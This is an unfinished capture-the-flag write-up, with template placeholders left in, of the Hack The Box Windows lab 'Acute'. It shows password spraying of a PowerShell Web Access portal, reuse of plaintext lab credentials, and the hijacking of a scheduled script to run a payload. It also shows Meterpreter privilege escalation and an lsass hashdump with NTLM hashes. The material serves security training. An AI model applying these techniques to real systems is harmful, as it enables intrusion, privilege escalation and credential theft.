---
description: >-
  Zweilosec's writeup on the hard-difficulty Windows machine Acute from 
  https://hackthebox.eu
title: Hack The Box - Acute Writeup                   # Add title of the machine here
date: 2022-07-18 08:00:00 -0600                           # Change the date to match completion date
categories: [Hack the Box, Writeups]                     # Change Templates to Writeup
tags: [htb, hacking, hack the box, writeup, windows, powershell, metadata, web, redteam, incomplete]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
image: /assets/img/acute_0_infocard.png                # Add infocard image here for post preview image

---

## HTB - Acute - 10.10.11.145

## Overview

![Descriptive information card about this machine](/assets/img/acute_0_infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

### Useful thing 1

description with generic example

### Useful thing 2

description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.11.145`.  The options I regularly use are: 

| `Flag` | Purpose |
| :--- | :--- |
| `-p-` | A shortcut which tells nmap to scan all ports |
| `-vvv` | Gives very verbose output so I can see the results as they are found, and also includes some information not normally shown |
| `-sC` | Equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target |
| `-sV` | Does a service version scan |
| `-oA $name` | Saves all three formats \(standard, greppable, and XML\) of output with a filename of `$name` |

First I scanned for open ports, then fed the ports list back into nmap to do a more in-depth service scan.

```
┌──(zweilos㉿kalimaa)-[~/htb/acute]
└─$ nmap -Pn -vvv -p- --min-rate 1000 10.10.11.145 -oN ports.acute 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 18:48 CDT
Initiating Parallel DNS resolution of 1 host. at 18:48
Completed Parallel DNS resolution of 1 host. at 18:48, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:48
Scanning 10.10.11.145 [65535 ports]
Discovered open port 443/tcp on 10.10.11.145
Connect Scan Timing: About 23.08% done; ETC: 18:50 (0:01:43 remaining)
Connect Scan Timing: About 46.29% done; ETC: 18:50 (0:01:11 remaining)
Connect Scan Timing: About 69.54% done; ETC: 18:50 (0:00:40 remaining)
Completed Connect Scan at 18:50, 123.27s elapsed (65535 total ports)
Nmap scan report for 10.10.11.145
Host is up, received user-set (0.069s latency).
Scanned at 2022-07-04 18:48:00 CDT for 124s
Not shown: 65534 filtered tcp ports (no-response)
PORT    STATE SERVICE REASON
443/tcp open  https   syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 123.35 seconds
```


port 443 was the only one open - after accepting the security warning, was directed to a 404 error page

Checking the certificate gave a hostname of the CA and the host
Common Name
atsserver.acute.local

Common Name
acute-ATSSERVER-CA

DNS Name
atsserver

On the About.html page there was a link to "New Starter Forms" -> https://atsserver.acute.local/New_Starter_CheckList_v7.docx; also usernames Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins.

The document contained a few links
The University’s staff induction pages can be found at: https://atsserver.acute.local/Staff 
The Staff Induction portal can be found here: https://atsserver.acute.local/Staff/Induction 

These two links were also broken
It also had a link to remote training at https://atsserver.acute.local/Acute_Staff_Access
This led to a PowerShell Web Access portal at https://atsserver.acute.local/Acute_Staff_Access/en-US/logon.aspx?ReturnUrl=%2fAcute_Staff_Access

There is an option for kerberos authentication; looks like could potentially use this to enumerate users

From the document "**Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin. **"

Also:
"Walk the new starter through the password change policy, they will need to change it from the default `Password1!`. Not all staff are changing these so please be sure to run through this.""

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831611(v=ws.11)?redirectedfrom=MSDN

PhysicalPath: %windir%/Web/PowerShellWebAccess/wwwroot

https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn282394(v=ws.11)
> Security Note
> A user needs only one rule to be true to get access. If a user is given access to one computer with either full language access or access only to Windows PowerShell remote management cmdlets, from the web-based console, the user can log on (or hop) to other computers that are connected to the first target computer. The most secure way to configure Windows PowerShell Web Access is to allow users access only to constrained session configurations (also called endpoints or runspaces) that allow them to accomplish specific tasks that they normally need to perform remotely.

```
┌──(zweilos㉿kalimaa)-[~/htb/acute]
└─$ exiftool New_Starter_CheckList_v7.docx
ExifTool Version Number         : 12.42
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2022:07:04 19:00:45-05:00
File Access Date/Time           : 2022:07:04 19:01:30-05:00
File Inode Change Date/Time     : 2022:07:04 19:01:29-05:00
File Permissions                : -rw-r--r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000

```

Running exiftool on the document reveals the name of a computer `Acute-PC01`, and a username `FCastle`.  Using the names I found earlier I made a list of usernames with the format firstInitial + lasName. 

Using burp intruder (image) was able to ID the username EDavies hadnt changed his password~
(image)

After logging in, I was brought to a web powershell prompt



## Initial Foothold

```powershell
PS C:\Users\edavies\Documents> 

Get-ExecutionPolicy

Restricted

PS C:\Users\edavies\Documents> 

Get-ChildItem Env:

 

Name                           Value                                                                                   

----                           -----                                                                                   

ALLUSERSPROFILE                C:\ProgramData                                                                          

APPDATA                        C:\Users\edavies\AppData\Roaming                                                        

CommonProgramFiles             C:\Program Files\Common Files                                                           

CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files                                                     

CommonProgramW6432             C:\Program Files\Common Files                                                           

COMPUTERNAME                   ACUTE-PC01                                                                              

ComSpec                        C:\Windows\system32\cmd.exe                                                             

DriverData                     C:\Windows\System32\Drivers\DriverData                                                  

HOMEDRIVE                      C:                                                                                      

HOMEPATH                       \Users\edavies                                                                          

LOCALAPPDATA                   C:\Users\edavies\AppData\Local                                                          

LOGONSERVER                    \\ATSSERVER                                                                             

NUMBER_OF_PROCESSORS           1                                                                                       

OneDrive                       C:\Users\edavies\OneDrive                                                               

OS                             Windows_NT                                                                              

Path                           C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPo...

PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                              

PROCESSOR_ARCHITECTURE         AMD64                                                                                   

PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 85 Stepping 7, GenuineIntel                                      

PROCESSOR_LEVEL                6                                                                                       

PROCESSOR_REVISION             5507                                                                                    

ProgramData                    C:\ProgramData                                                                          

ProgramFiles                   C:\Program Files                                                                        

ProgramFiles(x86)              C:\Program Files (x86)                                                                  

ProgramW6432                   C:\Program Files                                                                        

PSModulePath                   C:\Users\edavies\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShe...

PUBLIC                         C:\Users\Public                                                                         

SystemDrive                    C:                                                                                      

SystemRoot                     C:\Windows                                                                              

TEMP                           C:\Users\edavies\AppData\Local\Temp                                                     

TMP                            C:\Users\edavies\AppData\Local\Temp                                                     

USERDNSDOMAIN                  ACUTE.LOCAL                                                                             

USERDOMAIN                     ACUTE                                                                                   

USERDOMAIN_ROAMINGPROFILE      ACUTE                                                                                   

USERNAME                       edavies                                                                                 

USERPROFILE                    C:\Users\edavies                                                                        

windir                         C:\Windows                                                                              
```

```
PS C:\Users\edavies\Documents> whoami /all


USER INFORMATION

----------------
User Name     SID                                           

============= ==============================================

acute\edavies S-1-5-21-1786406921-1914792807-2072761762-1106


GROUP INFORMATION

-----------------


Group Name                                 Type             SID          Attributes                                    

    

========================================== ================ ============ ==================================================

Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group

BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group

BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group

Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group

Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192    

PRIVILEGES INFORMATION

----------------------

Privilege Name                Description                    State  

============================= ============================== =======

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 

USER CLAIMS INFORMATION

-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```


```
PS C:\Users\edavies> 

Get-LocalUser | Format-Table Name,Enabled,LastLogon,SID

 

Name               Enabled LastLogon              SID                                           

----               ------- ---------              ---                                           

Administrator        False 11/18/2020 11:43:09 PM S-1-5-21-2560123600-3246320471-2688489995-500 

DefaultAccount       False                        S-1-5-21-2560123600-3246320471-2688489995-503 

Guest                False                        S-1-5-21-2560123600-3246320471-2688489995-501 

Natasha               True 12/21/2021 12:39:13 PM S-1-5-21-2560123600-3246320471-2688489995-1001

WDAGUtilityAccount   False                        S-1-5-21-2560123600-3246320471-2688489995-504 
```

There was another user `Natasha` on this machine

```
PS C:\Users\edavies> 

Get-ChildItem C:\Users -Force | select Name

 

Name               

----               

administrator.ACUTE

All Users          

Default            

Default User       

edavies            

jmorgan            

Natasha            

Public             

desktop.ini        
```

There was also a user `jmorgan` who had a user folder

```
PS C:\Users\edavies> 

net user Natasha

User name                    Natasha

Full Name                    

Comment                      

User's comment               

Country/region code          000 (System Default)

Account active               Yes

Account expires              Never

 

Password last set            21/12/2021 10:23:01

Password expires             Never

Password changeable          22/12/2021 10:23:01

Password required            No

User may change password     Yes

 

Workstations allowed         All

Logon script                 

User profile                 

Home directory               

Last logon                   21/12/2021 13:39:13

 

Logon hours allowed          All

 

Local Group Memberships      

Global Group memberships     *None                 

The command completed successfully.
```

I couldnt find much information about either user. jmorgan had never logged into this machine
```
PS C:\Users\edavies> 

net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------

ACUTE\Domain Admins
ACUTE\jmorgan
Administrator

The command completed successfully.
```

however, jmorgan was an administrator

```
PS C:\Users\edavies> Get-computerinfo

WindowsBuildLabEx                                       : 19041.1.amd64fre.vb_release.191206-1406
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Education
WindowsInstallationType                                 : Client
WindowsInstallDateFromRegistry                          : 11/18/2021 10:57:05 PM
WindowsProductId                                        : 00328-10000-00001-AA030
WindowsProductName                                      : Windows 10 Education
WindowsRegisteredOrganization                           : 
WindowsRegisteredOwner                                  : Natasha
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 2009
```

It looked like the computer was owned by natasha, and was Windows 10 Education 20-09

```
PS C:\Users\edavies> 

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' 

 

 

    Directory: C:\Program Files

 

 

Mode                 LastWriteTime         Length Name                                                                 

----                 -------------         ------ ----                                                                 

d-----         12/7/2019   9:31 AM                Common Files                                                         

d-----        11/23/2021   8:30 AM                Internet Explorer                                                    

d-----         12/5/2021  12:13 AM                Microsoft Update Health Tools                                        

d-----         12/7/2019   9:14 AM                ModifiableWindowsApps                                                

d-----         12/6/2021  11:06 AM                PackageManagement                                                    

d-----        11/22/2021   8:45 PM                Windows Defender                                                     

d-----         1/12/2022   7:08 PM                Windows Defender Advanced Threat Protection                          

d-----        11/22/2021   8:21 PM                Windows Mail                                                         

d-----        11/22/2021   8:21 PM                Windows Media Player                                                 

d-----         12/7/2019   2:47 PM                Windows Multimedia Platform                                          

d-----         12/7/2019   2:44 PM                Windows NT                                                           

d-----          4/9/2021   2:20 PM                Windows Photo Viewer                                                 

d-----         12/7/2019   2:47 PM                Windows Portable Devices                                             

d-----         12/7/2019   9:31 AM                Windows Security                                                     

d-----         12/6/2021  11:06 AM                WindowsPowerShell                                                    

 

 

    Directory: C:\Program Files (x86)

 

 

Mode                 LastWriteTime         Length Name                                                                 

----                 -------------         ------ ----                                                                 

d-----         12/7/2019   9:31 AM                Common Files                                                         

d-----        11/23/2021   8:30 AM                Internet Explorer                                                    

d-----        11/22/2021   3:47 PM                Microsoft                                                            

d-----         12/7/2019   9:31 AM                Microsoft.NET                                                        

d-----          4/9/2021   2:20 PM                Windows Defender                                                     

d-----        11/22/2021   8:21 PM                Windows Mail                                                         

d-----        11/22/2021   8:21 PM                Windows Media Player                                                 

d-----         12/7/2019   2:47 PM                Windows Multimedia Platform                                          

d-----         12/7/2019   2:44 PM                Windows NT                                                           

d-----          4/9/2021   2:20 PM                Windows Photo Viewer                                                 

d-----         12/7/2019   2:47 PM                Windows Portable Devices                                             

d-----         12/7/2019   9:31 AM                WindowsPowerShell                                                    
```

Not much in the way of installed software

```
PS C:\Users\edavies> 

netstat -nao

 

Active Connections

 

  Proto  Local Address          Foreign Address        State           PID

  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       888

  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4

  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       748

  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4

  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       2452

  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4

  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       632

  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       568

  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       688

  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       504

  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       632

  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       624

  TCP    172.16.22.2:139        0.0.0.0:0              LISTENING       4

  TCP    172.16.22.2:5985       172.16.22.1:60300      ESTABLISHED     4

  TCP    172.16.22.2:5985       172.16.22.1:60302      ESTABLISHED     4

  TCP    172.16.22.2:5985       172.16.22.1:60310      TIME_WAIT       0

  TCP    172.16.22.2:5985       172.16.22.1:60311      ESTABLISHED     4

  TCP    172.16.22.2:5985       172.16.22.1:63895      ESTABLISHED     4

  TCP    172.16.22.2:5985       172.16.22.1:63902      ESTABLISHED     4

  TCP    172.16.22.2:5985       172.16.22.1:63929      ESTABLISHED     4

  TCP    172.16.22.2:63840      172.16.22.1:5985       TIME_WAIT       0

  TCP    [::]:135               [::]:0                 LISTENING       888

  TCP    [::]:445               [::]:0                 LISTENING       4

  TCP    [::]:5985              [::]:0                 LISTENING       4

  TCP    [::]:7680              [::]:0                 LISTENING       2452

  TCP    [::]:47001             [::]:0                 LISTENING       4

  TCP    [::]:49664             [::]:0                 LISTENING       632

  TCP    [::]:49665             [::]:0                 LISTENING       568

  TCP    [::]:49666             [::]:0                 LISTENING       688

  TCP    [::]:49667             [::]:0                 LISTENING       504

  TCP    [::]:49670             [::]:0                 LISTENING       632

  TCP    [::]:49678             [::]:0                 LISTENING       624

  UDP    0.0.0.0:123            *:*                                    1036

  UDP    0.0.0.0:500            *:*                                    504

  UDP    0.0.0.0:4500           *:*                                    504

  UDP    0.0.0.0:5050           *:*                                    748

  UDP    0.0.0.0:5353           *:*                                    4264

  UDP    0.0.0.0:5353           *:*                                    1128

  UDP    0.0.0.0:5353           *:*                                    4264

  UDP    0.0.0.0:5355           *:*                                    1128

  UDP    127.0.0.1:1900         *:*                                    3196

  UDP    127.0.0.1:52089        *:*                                    632

  UDP    127.0.0.1:52097        *:*                                    504

  UDP    127.0.0.1:56063        *:*                                    1544

  UDP    127.0.0.1:59754        *:*                                    3196

  UDP    127.0.0.1:61269        *:*                                    4256

  UDP    127.0.0.1:63321        *:*                                    1128

  UDP    172.16.22.2:137        *:*                                    4

  UDP    172.16.22.2:138        *:*                                    4

  UDP    172.16.22.2:1900       *:*                                    3196

  UDP    172.16.22.2:59753      *:*                                    3196

  UDP    [::]:123               *:*                                    1036

  UDP    [::]:500               *:*                                    504

  UDP    [::]:4500              *:*                                    504

  UDP    [::]:5353              *:*                                    1128

  UDP    [::]:5353              *:*                                    4264

  UDP    [::]:5355              *:*                                    1128

  UDP    [::1]:1900             *:*                                    3196

  UDP    [::1]:59752            *:*                                    3196

  UDP    [fe80::9513:4361:23ec:64fd%14]:1900  *:*                                    3196

  UDP    [fe80::9513:4361:23ec:64fd%14]:59751  *:*                                    3196
  ```
  
  Netstat showed more ports open on the inside I didnt see before
  
  ```powershell
  $passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
  $cred = New-Object System.Management.Automation.PSCredential ("acute\imonks",$passwd)
  ```
  
  ```
  PS C:\Windows\system32> Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
Enter-PSSession : The term 'Measure-Object' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
At line:1 char:1
+ Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage  ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Measure-Object:String) [Enter-PSSession], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

https://petri.com/managing-windows-server-containers-with-powershell-managing-containers/

Aparently this is a container

> If you run Enter-PSSession too soon after starting a container, then you will get the following misleading error:
Enter-PSSession : The term ‘Measure-Object’ is not recognized as the name of a cmdlet, function, script file, or operable program.

> The advantage of Enter-PSSession is that it allows you to get quite a bit of manual work done inside of a container. However, it is an interactive-only approach, and it is not suitable for remote scripting.
If you want to run a single command against a container, or if you want to script administrative tasks inside of a container, then you should use Invoke-Command. Invoke-Command allows you to execute a script block against a machine or a container; the example below will send a script block to retrieve the IPv4 address of a container, which we might later use to create NAT rules on a VM host.

```powershell
Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(ls $env:userprofile/Desktop)} -Credential $cred
```

Had a very hard time getting commands to run, but I was there

```powershell
Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(whoami /all)} -Credential $cred
Program 'whoami.exe' failed to run: The term 'Out-String' is not recognized as the name of a cmdlet, function, script 
file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct 
and try again.At line:1 char:3
+ $(whoami /all)
+   ~~~~~~~~~~~.
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
    + PSComputerName        : atsserver
```

```
PS C:\Windows\system32> Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(ls $env:userprofile/Desktop)} -Credential $cred
Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(ls $env:userprofile/Desktop)} -Credential $cred


    Directory: C:\Users\imonks\Desktop


Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-ar---        15/07/2022     13:32             34 user.txt                           atsserver                         
-a----        11/01/2022     18:04            602 wm.ps1                             atsserver
```
  
```powershell
PS C:\Windows\system32>Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(cat $env:userprofile/Desktop\user.txt)} -Credential $cred
e54e8178e5aca9f07aed75672ee6492a
```

```powershell
PS C:\Windows\system32>Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(cat $env:userprofile/Desktop\wm.ps1)} -Credential $cred
```

```powershell
PS C:\Windows\system32>Invoke-Command -computername atsserver -ConfigurationName dc_manage -ScriptBlock {$(cat $env:userprofile/Desktop\wm.ps1)} -Credential $cred

$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

## Road to User

### Further enumeration

### Finding user creds

### User.txt


## Path to Power \(Gaining Administrator Access\)

### Enumeration as user `username`

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\test.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred

Windows PowerShell Credential Request: Windows PowerShell credential request
Warning: A script or application on the remote computer ACUTE-PC01 is requesting your credentials. Enter your credentials only if you trust the remote computer and the application or script that is requesting them. 

Enter your credentials.

Enter your user name: acute\imonks
Enter your password: *****************
```

```
meterpreter > getsid
Server SID: S-1-5-21-1786406921-1914792807-2072761762-1108
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

```

```
PS C:\Users\jmorgan\Documents> whoami /all
whoami /all

USER INFORMATION
----------------

User Name     SID                                           
============= ==============================================
acute\jmorgan S-1-5-21-1786406921-1914792807-2072761762-1108


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                                     
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

ERROR: Unable to get user claims information.
```

I was a full admin on Acute-PC01, but not on ATSSERVER

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{whoami /all} -credential $cred

 

USER INFORMATION

----------------

 

User Name    SID                                           

============ ==============================================

acute\imonks S-1-5-21-1786406921-1914792807-2072761762-1107

 

 

GROUP INFORMATION

-----------------

 

Group Name                                 Type             SID                                            Attributes  

                                      

========================================== ================ ============================================== ============

======================================

Everyone                                   Well-known group S-1-1-0                                        Mandatory gr

oup, Enabled by default, Enabled group

BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory gr

oup, Enabled by default, Enabled group

BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory gr

oup, Enabled by default, Enabled group

BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                   Mandatory gr

oup, Enabled by default, Enabled group

NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory gr

oup, Enabled by default, Enabled group

NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory gr

oup, Enabled by default, Enabled group

NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory gr

oup, Enabled by default, Enabled group

ACUTE\Managers                             Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory gr

oup, Enabled by default, Enabled group

Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory gr

oup, Enabled by default, Enabled group

Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                

                                      

 

 

PRIVILEGES INFORMATION

----------------------

 

Privilege Name                Description                    State  

============================= ============================== =======

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

 

 

USER CLAIMS INFORMATION

-----------------------

 

User claims unknown.

 

Kerberos support for Dynamic Access Control on this device has been disabled.
```

imonks was in an interesting group: acute/Managers

```
PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{net group MANAGERS} -credential $cred

Group name     Managers

Comment        

 

Members

 

-------------------------------------------------------------------------------

awallace                 imonks                   

The command completed successfully.
```

There was another user in this group: awallace

```
meterpreter > migrate 632
[*] Migrating from 6768 to 632...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
```

I was able to run hashdump after migrating processes to lsass.exe

cracked the pass with crackstation.net
Administrator Password@123 - did not work, maybe another user has this password

### awallace

```
PS C:\utils> 

$passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential ("acute\awallace",$passwd)

PS C:\utils> 

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{whoami /all} -credential $cred

 

USER INFORMATION

----------------

 

User Name      SID                                           

============== ==============================================

acute\awallace S-1-5-21-1786406921-1914792807-2072761762-1104

 

 

GROUP INFORMATION

-----------------

 

Group Name                                   Type             SID                                            Attributes

                                                     

============================================ ================ ============================================== ==========

=====================================================

Everyone                                     Well-known group S-1-1-0                                        Mandatory 

group, Enabled by default, Enabled group             

BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory 

group, Enabled by default, Enabled group             

BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory 

group, Enabled by default, Enabled group             

BUILTIN\Certificate Service DCOM Access      Alias            S-1-5-32-574                                   Mandatory 

group, Enabled by default, Enabled group             

BUILTIN\Administrators                       Alias            S-1-5-32-544                                   Mandatory 

group, Enabled by default, Enabled group, Group owner

NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory 

group, Enabled by default, Enabled group             

NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory 

group, Enabled by default, Enabled group             

NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory 

group, Enabled by default, Enabled group             

ACUTE\Domain Admins                          Group            S-1-5-21-1786406921-1914792807-2072761762-512  Mandatory 

group, Enabled by default, Enabled group             

ACUTE\Managers                               Group            S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory 

group, Enabled by default, Enabled group             

ACUTE\Site_Admin                             Group            S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory 

group, Enabled by default, Enabled group             

